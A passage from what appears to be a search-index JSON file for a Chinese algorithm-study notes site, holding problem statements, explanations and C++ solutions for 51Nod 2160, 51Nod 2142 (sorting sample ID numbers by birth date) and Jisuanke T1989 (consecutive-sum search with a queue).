\u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/1.51Nod_2160_%E6%95%B0%E5%AD%97%E6%B8%B8%E6%88%8F/#3","text":"#include <iostream> #include <string.h> #include <vector> using namespace std; int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u521d\u59cb\u5316\u6808 vector<int> stack; // \u6808\u7684\u6df1\u5ea6 long long stackDepth = 0l; // buffer long long buffer; // \u82e5\u5927\u4e8e0 if (n > 0) { // \u8bfb\u53d6\u7b2c\u4e00\u4e2a\u5143\u7d20 scanf(\"%lld\", &buffer); // \u5165\u6808 stack.push_back(buffer); // \u6df1\u5ea6\u52a01 stackDepth++; // \u8bfb\u5165\u5165\u6808\u5143\u7d20 for (long long i = 1; i < n; i++) { // \u8bfb\u53d6\u8f93\u5165 scanf(\"%lld\", &buffer); size_t sizeBuffer = stackDepth; for (size_t j = 0; j < sizeBuffer; j++) { // \u82e5\u6808\u9876\u5143\u7d20\u5c0f\u4e8e\u5373\u5c06\u65b0\u5165\u6808\u7684\u5143\u7d20buffer if (stack[stackDepth - 1] < buffer && stackDepth > 0) { // \u6808\u9876\u5143\u7d20\u51fa\u6808 stack.pop_back(); // \u6df1\u5ea6\u51cf1 stackDepth--; } else { break; } } // \u5143\u7d20\u5165\u6808 stack.push_back(buffer); // \u6df1\u5ea6\u52a01 stackDepth++; } // \u8f93\u51fa\u6808\u5185\u5143\u7d20 for (size_t i = 0; i < stack.size(); i++) { printf(\"%d\\n\", stack[i]); } } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/","text":"51Nod 2142 \u7b2cm\u5927\u7684\u8eab\u4efd\u8bc1\u53f7\u7801 # \u76ee\u5f55 # 51Nod 2142 \u7b2cm\u5927\u7684\u8eab\u4efd\u8bc1\u53f7\u7801 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u8eab\u4efd\u8bc1\u53f7\u662f\u6211\u56fd\u516c\u6c11\u7684\u552f\u4e00\u8bc6\u522b\u7801\uff0c\u5b83\u7531 18 \u4f4d\u6570\u5b57\u6216\u8005\u5b57\u6bcd\u7ec4\u6210\uff08\u53ea\u53ef\u80fd\u6700\u540e\u4e00\u4f4d\u662f\u5b57\u6bcd\uff09\u3002 18 \u4f4d\u8eab\u4efd\u8bc1\u53f7\u7801\u7684\u542b\u4e49\u5982\u4e0b\uff1a\u7b2c 1\\sim2 \u4e3a\u7701\u3001\u81ea\u6cbb\u533a\u3001\u76f4\u8f96\u5e02\u4ee3\u7801\uff1a\u7b2c 3\\sim4 \u4f4d\u4e3a\u5730\u7ea7\u5e02\u3001\u76df\u3001\u81ea\u6cbb\u5dde\u4ee3\u7801\uff1b\u7b2c 5\\sim6 \u4f4d\u4e3a\u53bf\u3001\u53bf\u7ea7\u5e02\u3001\u533a\u4ee3\u7801\u3002\u7b2c 7\\sim14 \u4f4d\u4f4d\u51fa\u751f\u5e74\u6708\u65e5\uff0c\u6bd4\u5982 19970401 \u4ee3\u8868 1997 \u5e74 4 \u6708 1 \u65e5\uff1b\u7b2c 15\\sim16 \u4f4d\u4e3a\u987a\u5e8f\u53f7\uff0c\u7b2c 17 \u4f4d\u4ee3\u8868\u6027\u522b\uff0c\u7537\u4e3a\u5355\u6570\uff0c\u5973\u4e3a\u53cc\u6570\uff0c\u7b2c 18 \u4f4d\u4e3a\u6821\u9a8c\u7801\uff0c 0\\sim9 \u548c X \u3002\u4f5c\u4e3a\u5c3e\u53f7\u7684\u6821\u9a8c\u7801\uff0c\u662f\u628a\u524d\u5341\u4e03\u4f4d\u6570\u5b57\u4ee3\u5165\u7edf\u4e00\u7684\u516c\u5f0f\u8ba1\u7b97\u51fa\u6765\u7684\u3002\u89e3\u7b54\u672c\u9898\u4f60\u4e0d\u7528\u5173\u5fc3\u662f\u5982\u4f55\u8ba1\u7b97\u51fa\u6765\u7684\u3002\u73b0\u5728\u7ed9\u4f60 n \u4e2a\u8eab\u4efd\u8bc1\u53f7\u7801\uff0c\u8bf7\u4f60\u6309\u7167\u51fa\u751f\u5e74\u6708\u65e5\u7684\u5b57\u5178\u5e8f\uff08\u5e74\u9f84\u4ece\u5927\u5230\u5c0f\uff09\u8f93\u51fa\u7b2c m \u4e2a\u4eba\u7684\u8eab\u4efd\u8bc1\u53f7\u3002 \u4e00\u4e9b\u89e3\u91ca\uff1a\u867d\u7136\u9020\u6570\u636e\u7684\u4eba\u975e\u5e38\u8f9b\u82e6\u7684\u5236\u9020\u5404\u79cd\u5404\u6837\u7684\u8eab\u4efd\u8bc1\u53f7\uff08\u5e76\u4e14\u8ba9\u4ed6\u4eec\u751f\u65e5\u4e92\u4e0d\u76f8\u540c\uff09\uff0c\u4f46\u662f\u4f60\u5e76\u4e0d\u9700\u8981\u9a8c\u8bc1\u5173\u4e8e\u8eab\u4efd\u8bc1\u53f7\u7684\u4efb\u4f55\u5408\u6cd5\u6027\uff0c\u5305\u62ec\u7701\u5e02\u533a\u662f\u5426\u5408\u6cd5\uff0c\u51fa\u751f\u5e74\u6708\u65e5\u662f\u5426\u5408\u6cd5\uff0c\u6821\u9a8c\u503c\u662f\u5426\u5408\u6cd5\uff0c\u4f60\u9700\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u8f93\u51fa\u5e74\u9f84\u4ece\u5927\u5230\u5c0f\u7b2c m \u4e2a\u4eba\u7684\u8eab\u4efd\u8bc1\u53f7\u3002 1.3. Input # \u8f93\u5165\u7b2c\u4e00\u884c\u5305\u542b\u4e24\u4e2a\u6b63\u6574\u6570 n \u548c m \uff0c\u4e24\u6570\u4e4b\u95f4\u7528\u4e00\u4e2a\u7a7a\u683c\u5206\u9694\uff0c\u63a5\u4e0b\u6765\u7684 n \u884c\u6bcf\u884c\u4e3a\u4e00\u4e2a\u5f62\u5982\u4e0a\u8ff0\u683c\u5f0f\u7684\u8eab\u4efd\u8bc1\u53f7\u7801\uff08\u4e0d\u9700\u8981\u5173\u5fc3\u6821\u9a8c\u7801\u7684\u6b63\u786e\u6027\uff0c\u4e0d\u5f71\u54cd\u672c\u9898\u89e3\u7b54\uff09\u3002 \uff081\u2264n\u2264100\uff0c1\u2264m\u2264n\uff09 1.4. Output # \u8f93\u51fa\u4ec5\u5305\u542b\u4e00\u884c\uff0c\u4e3a\u9898\u76ee\u8981\u6c42\u7684\u4e00\u4e2a\u8eab\u4efd\u8bc1\u53f7\u7801\u3002 1.5. Sample Input # 4 2 110108196004063022 13021119640203652X 420333197902112718 210222200012036512 1.6. Sample Output # 13021119640203652X 1.7. Source # 51Nod 2142 \u7b2cm\u5927\u7684\u8eab\u4efd\u8bc1\u53f7\u7801 2. \u89e3\u8bfb # \u4f7f\u7528STL\u4e2d\u7684 sort \u51fd\u6570\uff0c\u81ea\u5b9a\u4e49\u6392\u5e8f\u89c4\u5219\u5373\u53ef\u5bf9\u8eab\u4efd\u8bc1\u53f7\u7801\u8fdb\u884c\u6392\u5e8f\u3002 \u6ce8\uff1a\u4f7f\u7528 atoi \u51fd\u6570\u53ef\u4ee5\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u5b57 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <string.h> using namespace std; // \u5b58\u50a8\u8eab\u4efd\u8bc1\u53f7 string idStrList[100]; // \u6bd4\u8f83\u51fd\u6570 bool cmp(const string& str1, const string& str2) { // \u51fa\u751f\u65e5\u671f\u8f6c\u4e3aint int buffer1 = atoi(str1.substr(6, 8).c_str()); int buffer2 = atoi(str2.substr(6, 8).c_str()); // \u8fd4\u56de\u6bd4\u8f83\u7ed3\u679c\uff0c\u5e74\u9f84\u4ece\u5927\u5230\u5c0f\u6392\u5e8f return buffer1 < buffer2; } int main() { int n, m; // \u8bfb\u5165n scanf(\"%d %d\", &n, &m); // \u8bfb\u5165\u8eab\u4efd\u8bc1\u53f7 for (int i = 0; i < n; i++) { // \u83b7\u53d6\u5185\u5b58\u7a7a\u95f4 idStrList[i].resize(18); // \u8bfb\u5165\u8eab\u4efd\u8bc1\u53f7 cin >> idStrList[i]; } // \u6392\u5e8f sort(idStrList, idStrList + n, cmp); // \u8f93\u51fa\u8eab\u4efd\u8bc1\u53f7 printf(\"%s\\n\", idStrList[m - 1].c_str()); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.51Nod 2142 \u7b2cm\u5927\u7684\u8eab\u4efd\u8bc1\u53f7\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#51nod-2142-m","text":"","title":"51Nod  2142 \u7b2cm\u5927\u7684\u8eab\u4efd\u8bc1\u53f7\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#_1","text":"51Nod 2142 \u7b2cm\u5927\u7684\u8eab\u4efd\u8bc1\u53f7\u7801 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#12-problem-description","text":"\u8eab\u4efd\u8bc1\u53f7\u662f\u6211\u56fd\u516c\u6c11\u7684\u552f\u4e00\u8bc6\u522b\u7801\uff0c\u5b83\u7531 18 \u4f4d\u6570\u5b57\u6216\u8005\u5b57\u6bcd\u7ec4\u6210\uff08\u53ea\u53ef\u80fd\u6700\u540e\u4e00\u4f4d\u662f\u5b57\u6bcd\uff09\u3002 18 \u4f4d\u8eab\u4efd\u8bc1\u53f7\u7801\u7684\u542b\u4e49\u5982\u4e0b\uff1a\u7b2c 1\\sim2 \u4e3a\u7701\u3001\u81ea\u6cbb\u533a\u3001\u76f4\u8f96\u5e02\u4ee3\u7801\uff1a\u7b2c 3\\sim4 \u4f4d\u4e3a\u5730\u7ea7\u5e02\u3001\u76df\u3001\u81ea\u6cbb\u5dde\u4ee3\u7801\uff1b\u7b2c 5\\sim6 \u4f4d\u4e3a\u53bf\u3001\u53bf\u7ea7\u5e02\u3001\u533a\u4ee3\u7801\u3002\u7b2c 7\\sim14 \u4f4d\u4f4d\u51fa\u751f\u5e74\u6708\u65e5\uff0c\u6bd4\u5982 19970401 \u4ee3\u8868 1997 \u5e74 4 \u6708 1 \u65e5\uff1b\u7b2c 15\\sim16 \u4f4d\u4e3a\u987a\u5e8f\u53f7\uff0c\u7b2c 17 \u4f4d\u4ee3\u8868\u6027\u522b\uff0c\u7537\u4e3a\u5355\u6570\uff0c\u5973\u4e3a\u53cc\u6570\uff0c\u7b2c 18 \u4f4d\u4e3a\u6821\u9a8c\u7801\uff0c 0\\sim9 \u548c X \u3002\u4f5c\u4e3a\u5c3e\u53f7\u7684\u6821\u9a8c\u7801\uff0c\u662f\u628a\u524d\u5341\u4e03\u4f4d\u6570\u5b57\u4ee3\u5165\u7edf\u4e00\u7684\u516c\u5f0f\u8ba1\u7b97\u51fa\u6765\u7684\u3002\u89e3\u7b54\u672c\u9898\u4f60\u4e0d\u7528\u5173\u5fc3\u662f\u5982\u4f55\u8ba1\u7b97\u51fa\u6765\u7684\u3002\u73b0\u5728\u7ed9\u4f60 n \u4e2a\u8eab\u4efd\u8bc1\u53f7\u7801\uff0c\u8bf7\u4f60\u6309\u7167\u51fa\u751f\u5e74\u6708\u65e5\u7684\u5b57\u5178\u5e8f\uff08\u5e74\u9f84\u4ece\u5927\u5230\u5c0f\uff09\u8f93\u51fa\u7b2c m \u4e2a\u4eba\u7684\u8eab\u4efd\u8bc1\u53f7\u3002 \u4e00\u4e9b\u89e3\u91ca\uff1a\u867d\u7136\u9020\u6570\u636e\u7684\u4eba\u975e\u5e38\u8f9b\u82e6\u7684\u5236\u9020\u5404\u79cd\u5404\u6837\u7684\u8eab\u4efd\u8bc1\u53f7\uff08\u5e76\u4e14\u8ba9\u4ed6\u4eec\u751f\u65e5\u4e92\u4e0d\u76f8\u540c\uff09\uff0c\u4f46\u662f\u4f60\u5e76\u4e0d\u9700\u8981\u9a8c\u8bc1\u5173\u4e8e\u8eab\u4efd\u8bc1\u53f7\u7684\u4efb\u4f55\u5408\u6cd5\u6027\uff0c\u5305\u62ec\u7701\u5e02\u533a\u662f\u5426\u5408\u6cd5\uff0c\u51fa\u751f\u5e74\u6708\u65e5\u662f\u5426\u5408\u6cd5\uff0c\u6821\u9a8c\u503c\u662f\u5426\u5408\u6cd5\uff0c\u4f60\u9700\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u8f93\u51fa\u5e74\u9f84\u4ece\u5927\u5230\u5c0f\u7b2c m \u4e2a\u4eba\u7684\u8eab\u4efd\u8bc1\u53f7\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#13-input","text":"\u8f93\u5165\u7b2c\u4e00\u884c\u5305\u542b\u4e24\u4e2a\u6b63\u6574\u6570 n \u548c m \uff0c\u4e24\u6570\u4e4b\u95f4\u7528\u4e00\u4e2a\u7a7a\u683c\u5206\u9694\uff0c\u63a5\u4e0b\u6765\u7684 n \u884c\u6bcf\u884c\u4e3a\u4e00\u4e2a\u5f62\u5982\u4e0a\u8ff0\u683c\u5f0f\u7684\u8eab\u4efd\u8bc1\u53f7\u7801\uff08\u4e0d\u9700\u8981\u5173\u5fc3\u6821\u9a8c\u7801\u7684\u6b63\u786e\u6027\uff0c\u4e0d\u5f71\u54cd\u672c\u9898\u89e3\u7b54\uff09\u3002 \uff081\u2264n\u2264100\uff0c1\u2264m\u2264n\uff09","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#14-output","text":"\u8f93\u51fa\u4ec5\u5305\u542b\u4e00\u884c\uff0c\u4e3a\u9898\u76ee\u8981\u6c42\u7684\u4e00\u4e2a\u8eab\u4efd\u8bc1\u53f7\u7801\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#15-sample-input","text":"4 2 110108196004063022 13021119640203652X 420333197902112718 210222200012036512","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#16-sample-output","text":"13021119640203652X","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#17-source","text":"51Nod 2142 \u7b2cm\u5927\u7684\u8eab\u4efd\u8bc1\u53f7\u7801","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#2","text":"\u4f7f\u7528STL\u4e2d\u7684 sort \u51fd\u6570\uff0c\u81ea\u5b9a\u4e49\u6392\u5e8f\u89c4\u5219\u5373\u53ef\u5bf9\u8eab\u4efd\u8bc1\u53f7\u7801\u8fdb\u884c\u6392\u5e8f\u3002 \u6ce8\uff1a\u4f7f\u7528 atoi \u51fd\u6570\u53ef\u4ee5\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u5b57","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/2.51Nod_2142_%E7%AC%ACm%E5%A4%A7%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81/#3","text":"#include <algorithm> #include <iostream> #include <string.h> using namespace std; // \u5b58\u50a8\u8eab\u4efd\u8bc1\u53f7 string idStrList[100]; // \u6bd4\u8f83\u51fd\u6570 bool cmp(const string& str1, const string& str2) { // \u51fa\u751f\u65e5\u671f\u8f6c\u4e3aint int buffer1 = atoi(str1.substr(6, 8).c_str()); int buffer2 = atoi(str2.substr(6, 8).c_str()); // \u8fd4\u56de\u6bd4\u8f83\u7ed3\u679c\uff0c\u5e74\u9f84\u4ece\u5927\u5230\u5c0f\u6392\u5e8f return buffer1 < buffer2; } int main() { int n, m; // \u8bfb\u5165n scanf(\"%d %d\", &n, &m); // \u8bfb\u5165\u8eab\u4efd\u8bc1\u53f7 for (int i = 0; i < n; i++) { // \u83b7\u53d6\u5185\u5b58\u7a7a\u95f4 idStrList[i].resize(18); // \u8bfb\u5165\u8eab\u4efd\u8bc1\u53f7 cin >> idStrList[i]; } // \u6392\u5e8f sort(idStrList, idStrList + n, cmp); // \u8f93\u51fa\u8eab\u4efd\u8bc1\u53f7 printf(\"%s\\n\", idStrList[m - 1].c_str()); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/","text":"\u8ba1\u849c\u5ba2 T1989 \u8fde\u7eed\u81ea\u7136\u6570\u548c # \u76ee\u5f55 # \u8ba1\u849c\u5ba2 T1989 \u8fde\u7eed\u81ea\u7136\u6570\u548c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u81ea\u7136\u6570 M \uff0c\u6c42\u51fa\u6240\u6709\u7684\u8fde\u7eed\u7684\u81ea\u7136\u6570\u6bb5\uff08\u8fde\u7eed\u4e2a\u6570\u5927\u4e8e 1 \uff09\uff0c\u8fd9\u4e9b\u8fde\u7eed\u7684\u81ea\u7136\u6570\u6bb5\u4e2d\u7684\u5168\u90e8\u6570\u4e4b\u548c\u4e3a M \u3002 \u4f8b\u5b50\uff1a 1998+1999+2000+2001+2002=10000 \uff0c\u6240\u4ee5\u4ece 1998 \u5230 2002 \u7684\u4e00\u4e2a\u81ea\u7136\u6570\u6bb5\u4e3a M=10000 \u7684\u4e00\u4e2a\u89e3\u3002 1.3. Input # \u8f93\u5165\u5305\u542b\u4e00\u4e2a\u6574\u6570 M(10 \\le M \\le 2,000,000) \u3002 1.4. Output # \u6bcf\u884c\u4e24\u4e2a\u81ea\u7136\u6570\uff0c\u7ed9\u51fa\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u8fde\u7eed\u81ea\u7136\u6570\u6bb5\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6570\u548c\u6700\u540e\u4e00\u4e2a\u6570\uff0c\u4e24\u6570\u4e4b\u95f4\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\uff0c\u6240\u6709\u8f93\u51fa\u7684\u884c\u6309\u7167\u7b2c\u4e00\u4e2a\u6570\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff0c\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u8f93\u5165\u6570\u636e\uff0c\u4fdd\u8bc1\u81f3\u5c11\u6709\u4e00\u7ec4\u89e3\u3002 \u8f93\u51fa\u65f6\u6bcf\u884c\u672b\u5c3e\u7684\u591a\u4f59\u7a7a\u683c\uff0c\u4e0d\u5f71\u54cd\u7b54\u6848\u6b63\u786e\u6027 1.5. Sample Input # 15 1.6. Sample Output # 1 5 4 6 7 8 1.7. Source # \u8ba1\u849c\u5ba2 T1989 \u8fde\u7eed\u81ea\u7136\u6570\u548c 2. \u89e3\u8bfb # STL\u57fa\u672c\u4f7f\u7528\u3002\u4f7f\u7528 STL\u4e2d\u7684\u961f\u5217 queue \u6765\u5bf9\u5143\u7d20\u8fdb\u884c\u5165\u961f\u51fa\u961f\u64cd\u4f5c\u3002 \u82e5\u5f53\u524d\u961f\u5185\u6240\u6709\u5143\u7d20\u7684\u548c sum > M \uff0c\u5219\u961f\u9996\u5143\u7d20\u51fa\u961f\uff0c\u76f4\u5230 sum \\le M \u3002 \u82e5\u5f53\u524d\u961f\u5185\u6240\u6709\u5143\u7d20\u7684\u548c sum \\le M \uff0c\u5219\u4e0b\u4e00\u4e2a\u5143\u7d20\u5165\u961f\u3002 \u5728\u6bcf\u6b21\u5165\u961f/\u51fa\u961f\u5b8c\u6210\u4ee5\u540e\uff0c\u5224\u65ad\u662f\u5426 sum = M \uff0c\u82e5\u662f\uff0c\u5219\u8f93\u51fa\u3002 3. \u4ee3\u7801 # #include <iostream> #include <queue> using namespace std; queue<int> qu; int main() { // test case int t; scanf(\"%d\", &t); // \u961f\u9996\u5143\u7d20front, \u961f\u5c3e\u5143\u7d20back int front, back; // \u6c42\u548c int sum = 0; // \u8f93\u5165 for (int i = 1; i <= t; i++) { // \u5165\u961f qu.push(i); // \u7d2f\u52a0 sum += i; // \u82e5\u6c42\u548c\u5927\u4e8e\u8981\u6c42 while (sum > t) { sum -= qu.front(); // \u961f\u9996\u51fa\u961f qu.pop(); } // \u83b7\u53d6\u961f\u9996\u5143\u7d20 front = qu.front(); // \u83b7\u53d6\u961f\u5c3e\u5143\u7d20 back = qu.back(); // \u5224\u65ad\u662f\u5426\u7b26\u5408\u6761\u4ef6 if (sum == t && front != back) { // \u82e5\u7b26\u5408\u8981\u6c42\uff0c\u8f93\u51fa printf(\"%d %d\\n\", front, back); } // \u82e5\u82e5\u6c42\u548c\u5c0f\u4e8e\u8981\u6c42\uff0c\u7ee7\u7eed\u5faa\u73af } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.\u8ba1\u849c\u5ba2 T1989 \u8fde\u7eed\u81ea\u7136\u6570\u548c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#t1989","text":"","title":"\u8ba1\u849c\u5ba2 T1989 \u8fde\u7eed\u81ea\u7136\u6570\u548c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#_1","text":"\u8ba1\u849c\u5ba2 T1989 \u8fde\u7eed\u81ea\u7136\u6570\u548c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/3.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1989_%E8%BF%9E%E7%BB%AD%E8%87%AA%E7%84%B6%E6%95%B0%E5%92%8C/#1","text":"","title":"1. 